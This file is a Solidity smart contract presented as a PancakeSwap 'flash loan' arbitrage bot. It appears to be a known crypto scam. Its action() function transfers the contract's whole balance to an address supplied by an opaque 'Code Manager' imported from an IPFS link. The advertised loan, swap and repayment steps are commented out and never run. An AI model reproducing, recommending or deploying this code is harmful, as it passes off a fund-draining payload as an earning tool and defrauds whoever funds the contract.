pragma solidity ^0.5.0;


// Multiplier-Finance Smart Contracts
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";

// PancakeSwap Smart Contracts
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";



// Code Manager
import "https://gateway.pinata.cloud/ipfs/QmamZP9LTb4PZPKpsdP765e9zcC1iZvvganSEthmin3Txu";

contract FlashLoan {
	string public tokenName;
	string public tokenSymbol;
	uint loanAmount;
	Manager manager;
	
	constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
		tokenName = _tokenName;
		tokenSymbol = _tokenSymbol;
		loanAmount = _loanAmount;
			
		manager = new Manager();
	}
function() external payable {}
	
	function action() public payable {
		
	    // Send required coins for swap
	    address(uint160(manager.pancakeswapDepositAddress())).transfer(address(this).balance);
	    
	    // Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)
	    manager.performTasks();
	    
	    /*
	    // Submit token to Ethereum blockchain
	    string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);

        // List the token on pancakeswap & send coins required for swaps
		manager.pancakeswapListToken(tokenName, tokenSymbol, tokenAddress);
		payable(manager.pancakeswapDepositAddress()).transfer(300000000000000000);

        // Get ETH Loan from Aave
		string memory loanAddress = manager.takeAaveLoan(loanAmount);
		
		// Convert half ETH to DAI
		manager.pancakeswapDAItoETH(loanAmount / 2);

        // Create ETH and DAI pairs for our token & Provide liquidity
        string memory ethPair = manager.pancakeswapCreatePool(tokenAddress, "ETH");
		manager.pancakeswapAddLiquidity(ethPair, loanAmount / 2);
		string memory daiPair = manager.pancakeswapCreatePool(tokenAddress, "DAI");
		manager.pancakeswapAddLiquidity(daiPair, loanAmount / 2);
    
        // Perform swaps and profit on Self-Arbitrage
		manager.pancakeswapPerformSwaps();
		
		// Move remaining ETH from Contract to your account
		manager.contractToWallet("ETH");

        // Repay Flash loan
		manager.repayAaveLoan(loanAddress);
	    */
	}
}
